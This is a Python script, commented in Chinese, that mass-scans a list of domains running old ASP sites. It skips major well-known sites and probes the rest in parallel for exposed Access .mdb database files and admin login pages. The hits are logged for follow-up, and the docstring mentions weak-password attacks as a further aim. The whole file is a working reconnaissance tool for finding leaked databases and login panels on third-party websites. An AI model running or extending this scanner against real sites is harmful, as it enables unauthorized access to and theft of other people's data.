#!/usr/bin/env python3
"""old_asp_scan.py - ASP老站深挖: MDB泄露+后台路径+弱口令
"""
import urllib.request, urllib.parse, ssl, re, sys
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}

# 排除大站/知名站
BIG = ['jd.com', 'cnblogs.com', 'gushiwen.cn', 'chemicalbook.com', 'mysteel.com',
       '163.com', 'sohu.com', 'sina.com', 'qq.com', 'taobao.com', 'baidu.com',
       'chem17.com', 'nongjx.com', 'gkzhan.com']

def fetch(url, timeout=6):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(40000), r.geturl(), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(40000), e.geturl(), dict(e.headers)
    except Exception:
        return 0, b'', '', {}

def scan(dom):
    results = []
    # 1. MDB文件探测
    mdb_paths = ['/db/database.mdb', '/data/database.mdb', '/database.mdb', '/db.mdb',
                 '/data/data.mdb', '/databak.mdb', '/db/Data.mdb', '/inc/data.mdb',
                 '/DataBase.mdb', '/mdb/db.mdb', '/data/ly.mdb', '/bbs/data/bbs.mdb']
    for mp in mdb_paths:
        st, b, fu, hd = fetch('http://' + dom + mp)
        if st == 200 and (b[:4] == b'\x00\x01\x00\x00' or b'Standard Jet DB' in b[:64] or len(b) > 1000):
            results.append(('MDB', dom + mp, len(b)))
            break
    # 2. 后台路径
    admin_paths = ['/admin/login.asp', '/admin/index.asp', '/admin/', '/manage/login.asp',
                   '/houtai/login.asp', '/login.asp', '/admin/admin_login.asp', '/guanli/']
    for ap in admin_paths:
        st, b, fu, hd = fetch('http://' + dom + ap)
        if st == 200 and len(b) > 300:
            low = b.lower()
            has_pw = 'password' in low or 'type="password"' in low or 'pwd' in low or '登录' in b.decode('gbk', 'ignore')
            if has_pw:
                results.append(('ADMIN', dom + ap, len(b)))
                break
    return results if results else None

def main():
    doms = [d.strip() for d in open('/tmp/old_asp.txt') if d.strip()]
    doms = [d for d in doms if d not in BIG]
    print('targets: %d' % len(doms), flush=True)
    all_res = []
    with ThreadPoolExecutor(max_workers=14) as ex:
        futs = {ex.submit(scan, d): d for d in doms}
        for fu in as_completed(futs):
            try:
                r = fu.result()
            except Exception:
                r = None
            if r:
                for res in r:
                    all_res.append(res)
                    print('\t'.join(str(x) for x in res), flush=True)
    with open('/tmp/old_asp_hits.tsv', 'w') as f:
        for r in all_res:
            f.write('\t'.join(str(x) for x in r) + '\n')
    print('=== DONE: %d hits ===' % len(all_res), flush=True)

if __name__ == '__main__':
    main()
